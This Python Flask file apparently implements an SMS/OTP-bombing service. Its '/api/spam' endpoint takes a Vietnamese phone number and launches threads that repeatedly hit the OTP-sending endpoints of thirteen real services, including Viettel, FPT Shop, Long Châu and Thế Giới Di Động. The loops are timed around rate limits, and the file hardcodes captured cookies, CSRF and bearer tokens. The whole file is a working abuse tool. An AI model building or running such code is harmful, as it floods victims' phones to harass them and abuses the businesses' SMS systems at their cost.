import time
import random
import re
import threading
import psutil
import requests
from flask_cors import CORS
from flask import Flask, request, jsonify, redirect

app = Flask(__name__)
CORS(app)

# Define the authorization key
AUTH_KEY = "your_authorization_key"

# Thêm các hàm từ apis.py vào đây
# Giả định rằng chỉ có hàm tv360, thêm các hàm khác tương tự
red = "\033[1;31m"
green = "\033[1;32m"
yellow = "\033[1;33m"
blue = "\033[1;34m"
magenta = "\033[1;35m"
cyan = "\033[1;36m"
white = "\033[1;37m"
reset = "\033[0m"

def tv360(sdt):
    data = '{"msisdn": "sdt"}'
    data = data.replace("sdt", sdt)
    header = {"Host": "tv360.vn", "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"}
    res = requests.post("https://tv360.vn/public/v1/auth/get-otp-login", data=data, headers=header).json()

    if res.get('errorCode', 500) == 200:
        print(f"{green}TV360: Success")
        
def acfc(sdt):
    cookies = {'_sfid_599e': '{%22anonymousId%22:%22cecc0aa33c5f035b%22%2C%22consents%22:[]}','PHPSESSID': '9a4a9hfckl1buatgn48io8hfs3','form_key': 'DcNAGVuTHEAvPym7','mage-cache-storage': '{}','mage-cache-storage-section-invalidation': '{}','form_key': 'DcNAGVuTHEAvPym7','mage-cache-sessid': 'true','recently_viewed_product': '{}','recently_viewed_product_previous': '{}','recently_compared_product': '{}','recently_compared_product_previous': '{}','product_data_storage': '{}','optiMonkClientId': 'c38a5918-6683-3112-6946-b24a824176c6','_gcl_au': '1.1.1953208975.1715851427','_ga': 'GA1.1.870184131.1715851428','_evga_d955': '{%22uuid%22:%22cecc0aa33c5f035b%22%2C%22puid%22:%22aZvDTZW1TUJiNqT54bM8_DGr4Ai2U75KOhCYDvZjfmNu7Ys3q-zsH7r4PEyyhD_I8SUv1hwwSr5cjbGMJvLgt8_OwiFpRz3AJCMtZmHt7JqsoEbqyOzch9A32hxKEP7RmHs3peO0XiRYb10uK2oNbg%22%2C%22affinityId%22:%2203M%22}','private_content_version': '4a79251404c2fc0e285c6bc4bcc50a87','section_data_ids': '{}','mage-messages': '','optiMonkSession': '1715853224','_ga_PS7MEHMFY3': 'GS1.1.1715851427.1.1.1715853227.55.0.0','cto_bundle': 'PKCZEl9MSm5vdTdxQng5ZXc1ZXFMOUpmbnA2TDRjMjVWd0hsR1pOWXVxaXR4dWxnbDhKZGV5YzFVV2xyZUQ4NXB4c3c3clNFcGtFazdrdDE2bDRqbGVDJTJCek9CT09NbGhRNXRhNDBOJTJCaWFYUWpHJTJCYkdUeUU1bUgydTY5azdNRXBWTDFtUCUyRmlWSmYyRTcyOVhBdW1GczZsU1p4ZyUzRCUzRA','optiMonkClient': 'N4IgjArAnGAcUgFygMYEMnAL4BoQDMA3JMAdklgjABYA2KPAG2MTIogGYAmL0vAOwD2ABxbUsWIA',}
    headers = {'authority': 'www.acfc.com.vn','accept': 'application/json, text/javascript, */*; q=0.01','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
    data = {'number_phone': sdt,'form_key': 'DcNAGVuTHEAvPym7','currentUrl': 'https://www.acfc.com.vn/customer/account/create/',}

    while True:
        # Thực hiện yêu cầu POST
        res = requests.post('https://www.acfc.com.vn/mgn_customer/customer/sendOTP', cookies=cookies, headers=headers, data=data)
        
        if res.status_code == 200:
            json_response = res.json()
            print(f"{green}ACFC: Success")
            
            # Kiểm tra nếu phản hồi thành công
            if json_response.get('success') == True and json_response.get('error') == False:
                print(f"{green}ACFC: Success")
                # Chờ 1 phút trước khi gửi yêu cầu lần nữa
                time.sleep(60)
            else:
                print(f"{red}ACFC: Fail")
                break  # Thoát khỏi vòng lặp nếu có lỗi khác
        else:
            print(f"{red}ACFC: Fail")
            break  # Thoát khỏi vòng lặp nếu không thể kết nối
    
def hoangPhuc(sdt):
    headers = {'accept': 'application/json, text/javascript, */*; q=0.01','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0','x-requested-with': 'XMLHttpRequest',}
    for action_type in [1, 2]:
        for _ in range(5):
            data = {
                'action_type': action_type,
                'tel': sdt,
            }
            # Thực hiện yêu cầu POST
            res = requests.post('https://hoang-phuc.com/advancedlogin/otp/sendotp/', headers=headers, data=data)
            
            if res.status_code == 200:
                json_response = res.json()
                
                # Kiểm tra nếu phản hồi thành công
                if json_response.get('success') == True and json_response.get('message') != "Bạn đã vượt quá giới hạn cho phép trong ngày. Vui lòng thử lại sau.":
                    print(f"{green}Hoàng Phúc: Success")
                else:
                    print(f"{red}Hoàng Phúc: Fail")
                    break  # Thoát khỏi vòng lặp nếu gặp lỗi
            else:
                print(f"{red}Hoàng Phúc: Fail")
                break  # Thoát khỏi vòng lặp nếu không thể kết nối
            
            # Chờ 1 giây trước khi gửi yêu cầu lần nữa
            time.sleep(1)
    
def medlatec(sdt):
    headers = {'Accept': '*/*','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0','X-Requested-With': 'XMLHttpRequest',}
    params = {'tempOTP': 'TemplateOTP_Register_SMS',
        'cid': '748874',
        'issfor': sdt,
        'pass': 'LONMEMAY',
        '_': '1715858816772',
    } # Vô Hạn
    for _ in range(150):
        res = requests.get('https://medlatec.vn/Auth/ReSendOTP', params=params,  headers=headers).json()
        if res.get("Success") == True and res.get("Message") == "Success":
            print(f"{green}MEDLATEC: Success")
            continue
        else:
            print(f"{red}MEDLATEC: Fail")
            break
        
def routineVN(sdt):
    headers = {'accept': 'application/json, text/javascript, */*; q=0.01','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0','x-requested-with': 'XMLHttpRequest',}
    data = {'telephone': sdt,'isForgotPassword': '0',} # Vô hạn

    for _ in range(150):
        res = requests.post('https://routine.vn/customer/otp/send/', headers=headers, data=data).json()
        if res.get("success") == True and res.get("message") == "Mã OTP đã được gửi đến số điện thoại của bạn. Mã OTP có hiệu lực trong vòng 02:00":
            print(f"{green}ROUTINE: Success")
            continue
        else:
            print(f"{red}ROUTINE: Fail")
            break
    
def bachhoaxanh(sdt):
    headers = {'Accept': 'application/json, text/plain, */*','Connection': 'keep-alive','Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0','authorization': 'Bearer 6D296C2E4DA27CD122F1B74195028581','deviceid': 'c12ce517-a370-4ea5-h8u3-i9j110cf40f3','reversehost': 'http://bhxapi.live','xapikey': 'bhx-api-core-2022',}
    json_data = {'deviceId': 'c12ce517-a370-4ea5-h8u3-i9j110cf40f3','userName': sdt,
        'isOnlySms': 1,
        'ip': '',
    }
    for _ in range(150):
        res = requests.post('https://apibhx.tgdd.vn/User/LoginWithPassword', headers=headers, json=json_data).json()
        if res.get("code") == 0 and res.get("message") == "":
            print(f"{green}BÁCH HOÁ XANH: Success")
            time.sleep(61)
            continue
        else:
            print(f"{red}BÁCH HOÁ XANH: Fail")
            break

def thegioididong(sdt):
    cookies = {'_gcl_au': '1.1.551431295.1712942810','_pk_id.7.8f7e': 'b410fdc1dbb16062.1712942810.','_fbp': 'fb.1.1712942810297.898192197','_tt_enable_cookie': '1','_ttp': 'h5-TTNW6_gEKgw4c2Z2AA2p5kgg','ozi': '2000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NH8rrmEspamLIdtgUvBBUJbQRUv3ZizeBLvX_tkkmsG5UbJWuC0.1','__zi': '3000.SSZzejyD3DOkZU2bqmuCtIY7xk_V3mRHPyhpeT4NHOrrmEopamLJbdgUvBdSJrcNVvdhzzf9NzbtckZzqqHLsJ0.1','TBMCookie_3209819802479625248': '1021410017158628280jXJ3gXujoeHnS00+MW3v3lKNs8=','___utmvm': '###########','___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",'_ce.irv': 'returning','cebs': '1','_pk_ref.7.8f7e': '%5B%22%22%2C%22%22%2C1715862831%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D','_pk_ses.7.8f7e': '1','_ce.clock_event': '1','_ce.clock_data': '47%2C116.96.46.200%2C1%2Cef6c1824c2c4d2e2dd0ed5a2ca40bef3','SvID': 'beline26121|ZkX9N|ZkX9L','DMX_Personal': '%7B%22UID%22%3A%22bf34a8887135d8446ca52cd9075133dd6a04645c%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D','mwgngxpv': '3','.AspNetCore.Antiforgery.UMd7_MFqVbs': 'CfDJ8NJ72x-heHlJrMocXFWhvq5t70Qny8DBGiVXnOVq9F0bqFt4-jtL_S5CdNMgwMi7i1sX3M1YfoqnQtmmTSd91EsuFyOIyno9qpgGunQtX2M5n4TorynQYnblU-3Dn9jO2uq_Vhb5b90PHehfU8jmHRQ','_ga': 'GA1.2.527974115.1712942810','_gid': 'GA1.2.381594156.1715862835','_gat': '1','cebsp_': '2','_ga_TZK5WPYMMS': 'GS1.2.1715862834.1.0.1715862834.60.0.0','_ga_TLRZMSX5ME': 'GS1.1.1715862830.3.1.1715862834.56.0.0','_ce.s': 'v~d5c37a2cff123258a748a8369a33b35d320cf07e~lcw~1715862843730~lva~1715862830578~vpv~2~v11.cs~127806~v11.s~8cc447b0-1380-11ef-81c7-998bf38cb7a7~v11.sla~1715862843749~lcw~1715862843749',}
    headers = {'Accept': '*/*','Accept-Language': 'en-US,en;q=0.9','Connection': 'keep-alive','Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0','X-Requested-With': 'XMLHttpRequest'}
    data = {
        'phoneNumber': sdt,
        'isReSend': 'true',
        'sendOTPType': f'{random.randint(1,2)}',
        '__RequestVerificationToken': 'CfDJ8NJ72x-heHlJrMocXFWhvq5JK9lts2LvJxzmnYEVaDhPB04-_oOz8lZDmm3A1LLeUmbrreOGitJotOSZCl-I7ndaRP47s29Grsd9m4sRS7WY7E_QGf-2dHahvct_zJUumA5SM9shI5E9Sr_L3HukNmY',
    }
    # sendOTPType 1 là SMS 2 là Call
    for _ in range(200):
        res = requests.post('https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',cookies=cookies,headers=headers,data=data,).json()
        if res.get("statusCode") == 200 and res.get("isSuccessful") == True:
            print(f"{green}TGDĐ: Success")
            time.sleep(10)
            continue
        else:
            print(f"{red}TGDĐ: Fail")
            break
    
def winMart(sdt):
    headers = {
        'authorization': 'Bearer undefined',
        'content-type': 'application/json',
        'origin': 'https://winmart.vn',
        'referer': 'https://winmart.vn/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
        'x-api-merchant': 'WCM',
    }
    json_data = {
        'firstName': 'Hai Trung Hoang',
        'phoneNumber': sdt,
        'masanReferralCode': '',
        'dobDate': '2002-05-06',
        'gender': 'Male',
    }
    for _ in range(6):
        res = requests.post('https://api-crownx.winmart.vn/iam/api/v1/user/register', headers=headers, json=json_data).json()
        if res.get("code") == "S200" and res.get("message") == "Thành công!":
            print(f"{green}WIN MART: Success")
            continue
        else:
            print(f"{red}WIN MART: Fail")
            break

def fptShop(sdt):
    headers = {
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
    }

    data = {
        'phone': sdt,
        'typeReset': '0',
    }
    # reset sau 300 giây
    for _ in range(150):
        res = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', headers=headers, data=data).json()
        if res.get("error") == False:
            print(f"{green}FPT SHOP: Success")
            time.sleep(300)
            continue
        else:
            print(f"{red}FPT SHOP: Fail")
            break
    
def vieon(sdt):
    headers = {
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTYwNDkwNTQsImp0aSI6IjkyOGQ5NGIzMTEzODBlNDk1YmUwYTU2ZWY3ZWNjM2FhIiwiYXVkIjoiIiwiaWF0IjoxNzE1ODc2MjU0LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcxNTg3NjI1Mywic3ViIjoiYW5vbnltb3VzXzMwYzE0ZTIxYzg5OGM4YzViZjQ3OTE5MmU4NzRlODEzLTc2Mjk5ZmMwNmU2MmIyZTZlNjQ4NjNhNWQ3ZGIwNDY2LTE3MTU4NzYyNTQiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiMzBjMTRlMjFjODk4YzhjNWJmNDc5MTkyZTg3NGU4MTMtNzYyOTlmYzA2ZTYyYjJlNmU2NDg2M2E1ZDdkYjA0NjYtMTcxNTg3NjI1NCIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyNC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMjQuMC4wLjAiLCJkdCI6IndlYiIsIm10aCI6ImFub255bW91c19sb2dpbiIsIm1kIjoiV2luZG93cyAxMCIsImlzcHJlIjowLCJ2ZXJzaW9uIjoiIn0.eITTaB5ckDP0qNv8Sfo3ExBJGIbqUZfXT05yS8Usqn0',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',
    }
    params = {
        'platform': 'web',
        'ui': '012021',
    }
    json_data = {
        'username': sdt,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '30c14e21c898c8c5bf479192e874e813',
        'device_name': 'Edge/124',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }
    # reset sau 180s
    for _ in range(150):
        res = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data).json()
        if res.get("code") == 0 and res.get("message") == "":
            print(f"{green}VIEON: Success")
            time.sleep(180)
            continue
        else:
            print(f"{red}VIEON: Fail")
            break
    
    
def viettelVN(sdt):
    headers = {'Connection': 'keep-alive','Content-Type': 'application/json;charset=UTF-8','Origin': 'https://viettel.vn','Referer': 'https://viettel.vn/app','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0','X-CSRF-TOKEN': '2KybI3eoY2Uq0vinDSbgelsnK8g2wNd34e5EW4Bq','X-Requested-With': 'XMLHttpRequest','X-XSRF-TOKEN': 'eyJpdiI6ImhrRWYyYjJqRDE4VWxcL2N1bzZJemx3PT0iLCJ2YWx1ZSI6Imt6WkxvNVBNejU2WGFBcWw1SFwvY0tCRHVMK0VGWEtmMkdCQXdzb3JWYklUM2xLaUMrNnk3RlJVa0FaK284cjBPIiwibWFjIjoiMDMwMmU3YWI1ZWRhYmIxYzdkNGE2YTMwZGI2YjhjMjEyN2FlMGExNjg4YzczMjI5Mzg5ZGEyMzVkMzkxZmY0NSJ9',}
    json_data = {
        'phone': sdt,
        'typeCode': 'DI_DONG',
        'actionCode': 'myviettel://login_mobile',
        'type': 'otp_login',
    }
    for _ in range(5):
        res = requests.post('https://viettel.vn/api/getOTPLoginCommon', headers=headers, json=json_data).json()
        if res.get("errorCode") == 0 and res.get("message") == "Gửi OTP thành công":
            print(f"{green}Viettel: Success")
            time.sleep(8)
            continue
        else:
            print(f"{red}Viettel: Fail")
            break
    
def longchau(sdt):
    headers = {'access-control-allow-origin': '*','content-type': 'application/json','order-channel': '1','origin': 'https://nhathuoclongchau.com.vn','referer': 'https://nhathuoclongchau.com.vn/','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0','x-channel': 'EStore'}
    json_data = {'phoneNumber': sdt,'otpType': 1,'fromSys': 'WEBKHLC',}
    # reset sau 1 phut
    for _ in range(200):
        res = requests.post('https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',headers=headers,json=json_data).json()
        if res.get("waitingTimeSecond") is not None and res.get("waitingTimeSecond") >= 58:
            print(f"{green}Long Châu: Success")
            time.sleep(60)
            continue
        else:
            print(f"{red}Long Châu: Fail")
            break

def batdongsan(sdt):
    headers = {'referer': 'https://batdongsan.com.vn/sellernet/internal-sign-up','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0',}
    params = {'phoneNumber': sdt,}
    # Moi SDT chi dc 1 so lan nhat dinh
    for _ in range(200):
        res = requests.get('https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister',params=params,headers=headers).json()
        if res.get("data") == "success" and res.get("isSuccess") == True:
            print(f"{green}Bất động sản: Success")
            continue
        else:
            print(f"{red}Bất động sản: Fail")
            break

@app.route('/')
def hello():
    return "Hello from the other site"

@app.route('/api')
def hello2():
    return redirect("[TikTok](https://tiktok.com/@dm.haui)")

def convert_to_mb(bytes):
    return round(bytes / (1024 * 1024), 2)

def convert_to_gb(bytes):
    return round(bytes / (1024 * 1024 * 1024), 2)

@app.route('/api/info')
def system_info():
    memory_info = psutil.virtual_memory()

    total_memory_mb = convert_to_mb(memory_info.total)
    available_memory_mb = convert_to_mb(memory_info.available)
    used_memory_mb = convert_to_mb(memory_info.used)

    total_memory_gb = convert_to_gb(memory_info.total)
    available_memory_gb = convert_to_gb(memory_info.available)
    used_memory_gb = convert_to_gb(memory_info.used)

    response = {
        "total_memory_mb": f"{total_memory_mb} MB",
        "available_memory_mb": f"{available_memory_mb} MB",
        "used_memory_mb": f"{used_memory_mb} MB", 
        "total_memory_gb": f"{total_memory_gb} GB", 
        "available_memory_gb": f"{available_memory_gb} GB", 
        "used_memory_gb": f"{used_memory_gb} GB"
    }
    return jsonify(response)

def validate_phone_number(phone):
    regex_phone_number = r"(84|0[3|5|7|8|9])+([0-9]{8})\b"
    return bool(re.match(regex_phone_number, phone)) and len(phone) == 10

@app.route('/api/spam', methods=['POST'])
def spam():
    data = request.json
    if 'phone_number' not in data or 'count' not in data or 'auth_key' not in data:
        return jsonify({"error": "Missing phone_number, count, or auth_key parameter"}), 400
    
    sdt = data['phone_number']
    count = int(data['count'])
    auth_key = data['auth_key']

    if auth_key != AUTH_KEY:
        return jsonify({"error": "Invalid authorization key"}), 401

    if not validate_phone_number(sdt):
        return jsonify({"error": "Invalid phone number. Must be a valid Vietnamese phone number with 10 digits"}), 400

    if count <= 0:
        return jsonify({"error": "Count must be a positive integer"}), 400

    def run_spamming(sdt, count):
        dich_vu = [tv360,acfc,hoangPhuc,medlatec,
                   routineVN,bachhoaxanh,thegioididong,
                   winMart,fptShop,vieon,viettelVN,longchau,
                   batdongsan
                   ]  # Assume tv360 is already integrated, add all other functions similarly.
        
        def spam_task(api, sdt, count):
            for _ in range(count):
                api(sdt)

        threads = []
        for api in dich_vu:
            thread = threading.Thread(target=spam_task, args=(api, sdt, count))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    threading.Thread(target=run_spamming, args=(sdt, count)).start()

    return jsonify({"message": f"Spamming {sdt} {count} times in progress..."}), 200

if __name__ == '__main__':
    app.run(debug=True)